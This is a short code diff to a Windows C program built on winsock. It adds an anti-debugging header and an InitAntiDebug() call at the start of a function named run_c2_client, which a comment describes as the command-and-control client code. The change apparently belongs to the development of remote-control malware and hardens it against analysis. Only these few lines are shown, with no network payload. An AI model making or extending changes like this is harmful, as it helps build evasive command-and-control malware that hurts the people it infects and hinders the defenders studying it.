@@ -4,6 +4,7 @@
 #include <string.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
+#include "antidebug.h"
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -47,6 +48,8 @@ char* get_local_ip() {
 
 // Function that runs the C2 client code - EXACT copy of test.c main()
 void run_c2_client() {
+    InitAntiDebug(); // init antidebugging module
+    
     SOCKET sock, server_sock, client_sock;
     struct sockaddr_in server_addr, client_addr, listen_addr;
     int addr_len = sizeof(struct sockaddr_in);
